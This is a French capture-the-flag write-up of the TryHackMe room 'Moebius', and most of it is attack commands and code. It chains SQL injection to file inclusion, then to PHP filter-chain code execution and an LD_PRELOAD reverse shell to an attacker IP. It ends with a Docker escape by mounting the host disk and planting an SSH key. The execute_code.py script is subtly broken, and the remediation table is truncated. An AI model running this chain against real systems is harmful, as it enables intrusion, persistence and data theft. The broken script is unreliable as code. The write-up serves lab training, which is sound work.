# TryHackMe: Moebius

> **Objectif** : Le but est d'exploiter une vulnérabilité d'injection SQL pour obtenir une inclusion de fichier local (LFI), puis de la transformer en exécution de code à l'aide d'une chaîne de filtres PHP. Nous avons ensuite contourné les fonctions désactivées pour obtenir une exécution de code à distance (RCE), ce qui nous a permis d'accéder à un shell dans un conteneur Docker. En échappant au conteneur via le montage du système de fichiers de l'hôte, nous avons capturé le flag user. Enfin, nous avons trouvé le root flag dans la base de données SQL et complété la room.

---

## 1. Pré‑requis et préparation de l’environnement (détaillé)

| Élément                   | Version / Commande                                           | Remarque                                                   |
| ------------------------- | ------------------------------------------------------------ | ---------------------------------------------------------- |
| Distribution attaquante   | Kali Linux 2024.x                                            | Mettre à jour : `sudo apt update && sudo apt full-upgrade` |
| Adresse IP de l’attaquant | **10.21.208.96**                                             | Adapter dans tous les reverse‑shells                       |
| Adresse IP de la cible    | **10.10.176.115**                                            | Variable `TARGET` utilisée dans plusieurs extraits         |
| Outils requis             | `nmap`, `sqlmap`, `ffuf`, `gcc`, `python3`, `curl`, `netcat` | Tous préinstallés sous Kali                                |

Déclarer quelques alias pratiques :

```bash
export TARGET=10.10.176.115
alias tCurl="curl -sS --max-time 5"
```

---

## 2. Phase 1 : reconnaissance réseau complète

### 1.1 Scan exhaustif Nmap (avec sortie sur fichiers)

```bash
nmap -T4 -n -sC -sV -Pn -p- $TARGET -oA nmap/full
```

*Sortie résumée* :

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```

### 1.2 Inspection manuelle du site

1. Ouvrir le navigateur sur `http://$TARGET/`.
2. Repérer le lien « Image Grid » et noter les trois paramètres : `album.php?short_tag=cute`, `smart`, `fav`.
3. Cliquer sur une image révèle l’URL interne : `image.php?hash=<HMAC>&path=<chemin>`.

> **Observation** : la présence conjointe de `hash` et `path` suggère un calcul HMAC serveur.

---

## 3. Phase 2 : SQL Injection ➜ LFI

### 2.1 Recherche des caractères bloqués dans `short_tag`

```bash
ffuf -u "http://$TARGET/album.php?short_tag=FUZZ" \
     -w /usr/share/seclists/Fuzzing/special-chars.txt -mr "Hacking attempt"
```

Résultat : seuls les caractères ";" et "/" déclenchent le message « Hacking attempt ».

### 2.2 Exploration automatique avec sqlmap

Liste des schémas :

```bash
sqlmap -u "http://$TARGET/album.php?short_tag=smart" -p short_tag \
       --risk 3 --level 5 --threads 10 --batch --dbs
```

Dump des tables du schéma `web` :

```bash
sqlmap -u "http://$TARGET/album.php?short_tag=smart" -p short_tag \
       --risk 3 --level 5 --threads 10 --batch -D web --hex --dump
```

Affichage de la requête SQL exacte :

```bash
sqlmap -u "http://$TARGET/album.php?short_tag=smart" -p short_tag \
       --risk 3 --level 5 --batch -D web --statement --hex
```

> **Analyse** : requête de premier niveau `SELECT id FROM albums WHERE short_tag='<payload>'`.

### 2.3 Chaines d’injections imbriquées (manuel)

| Étape                                | URL / Commande                                                                         | Résultat attendu                |
| ------------------------------------ | -------------------------------------------------------------------------------------- | ------------------------------- |
| Contrôle de `album_id`               | `...short_tag=jxf' UNION SELECT 0-- -`                                                 | Page affiche l’`id` 0           |
| Retour de toutes les images          | `...short_tag=jxf' UNION SELECT "0 OR 1=1-- -"-- -`                                    | Trois albums fusionnés affichés |
| Découverte du bon nombre de colonnes | `...short_tag=jxf' UNION SELECT "0 UNION SELECT 1,2,3-- -"-- -`                        | Pas d’erreur SQL                |
| Inclusion de `/etc/passwd`           | `...short_tag=jxf' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764-- -"-- -` | Le HMAC s’affiche en HTML       |

Télécharger le fichier système :

```bash
tCurl "http://$TARGET/image.php?hash=<HMAC>&path=/etc/passwd" | head
```

---

## 4. Phase 3 : audit du code PHP & récupération de la clé HMAC

### 3.1 Lecture d’`album.php` via `php://filter`

```bash
PASS='php://filter/convert.base64-encode/resource=album.php'
HASH=$(python3 hash_calc.py "$PASS")
tCurl "http://$TARGET/image.php?hash=$HASH&path=$PASS" | base64 -d | less
```

### 3.2 Lecture de `dbconfig.php`

Même principe :

```bash
PASS='php://filter/convert.base64-encode/resource=dbconfig.php'
HASH=$(python3 hash_calc.py "$PASS")
tCurl "http://$TARGET/image.php?hash=$HASH&path=$PASS" | base64 -d
```

Extrait obtenu :

```
$SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW';
```

### 3.3 Script Python de calcul HMAC (annexe A)

```python
#!/usr/bin/env python3
import hmac, hashlib, sys
secret=b'an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW'
print(hmac.new(secret, sys.argv[1].encode(), hashlib.sha256).hexdigest())
```

---

## 5. Phase 4 : de la LFI à la RCE via filtres PHP

### 4.1 Génération de la chaîne malveillante

```bash
python3 php_filter_chain_generator.py --chain '<?=eval($_GET[0])?>'
```

Copier la chaîne (longue) dans la variable `CHAIN` :

```bash
CHAIN='php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp'
HASH=$(python3 hash_calc.py "$CHAIN")
```

### 4.2 Mini‑shell interactif (execute\_code.py)

```python
import hmac, hashlib, requests, readline, urllib.parse
secret=b'an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW'
path=b'" + CHAIN.encode() + b"'
H=hmac.new(secret,path,hashlib.sha256).hexdigest()
while True:
    cmd=input('code> ')
    params={'hash':H,'path':path,'0':cmd}
    r=requests.get(f'http://{sys.argv[1]}/image.php',params=params,timeout=5)
    print(r.text)
```

Lancer :

```bash
python3 execute_code.py $TARGET
```

---

## 6. Phase 5 : bypass des fonctions désactivées

### 5.1 Compilation de la bibliothèque partagée

```c
// shell.c
#include <stdlib.h>
void _init(){
    unsetenv("LD_PRELOAD");
    system("bash -c \"bash -i >& /dev/tcp/10.21.208.96/443 0>&1\"");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
python3 -m http.server 80
```

### 5.2 Téléchargement + exécution côté cible

```
code> $ch=curl_init('http://10.21.208.96/shell.so');curl_setopt($ch,19913,1);file_put_contents('/tmp/shell.so',curl_exec($ch));curl_close($ch);
code> putenv('LD_PRELOAD=/tmp/shell.so');mail('a','a','a','a');
```

Sur l’attaquant :

```bash
nc -lvnp 443
```

Shell obtenu :

```bash
www-data@bb28d5969dd5:/var/www/html$ id
```

---

## 7. Phase 6 : élévation root et évasion Docker

### 6.1 Prise de contrôle root dans le conteneur

```bash
www-data$ sudo -l
www-data$ sudo su -
root@bb28d5969dd5:~# id
```

### 6.2 Analyse des capacités & montage du FS hôte

```bash
grep CapEff /proc/self/status
mount /dev/nvme0n1p1 /mnt
cat /mnt/etc/hostname
```

### 6.3 Ajout de la clé SSH de l’attaquant

```bash
ssh-keygen -f id_ed25519 -t ed25519 -N ''
cat id_ed25519.pub >> /mnt/root/.ssh/authorized_keys
```

Connexion root :

```bash
ssh -i id_ed25519 root@$TARGET
cat /root/user.txt
```

---

## 8. Phase 7 : MariaDB et flag root

```bash
cat /root/challenge/db/db.env
PASSWORD=gG4i8NFNkcHBwUpd

docker ps --format "table {{.ID}}\t{{.Image}}\t{{.Names}}"
docker exec -it <ID_MARIADB> bash
mysql -u root -p$PASSWORD
```

```sql
show databases;
use secret;
select * from secrets;  -- ➜ flag root
```

---

## 9. Risques et remédiations prioritaires

| Vulnérabilité | Impact               | Remède immédiat |
| ------------- | -------------------- | --------------- |
| SQLi + LFI    | Exfiltration système | Prépar...       |

---

## 10. Annexe A : scripts

- `hash_calc.py` (HMAC)
- `execute_code.py` (shell via filtre)
- `shell.c` / `shell.so` (reverse‑shell LD\_PRELOAD)

*Tous les scripts sont éprouvés sous Python 3.11 / GCC 13.*

---

**Auteur :** Saad Idrissi
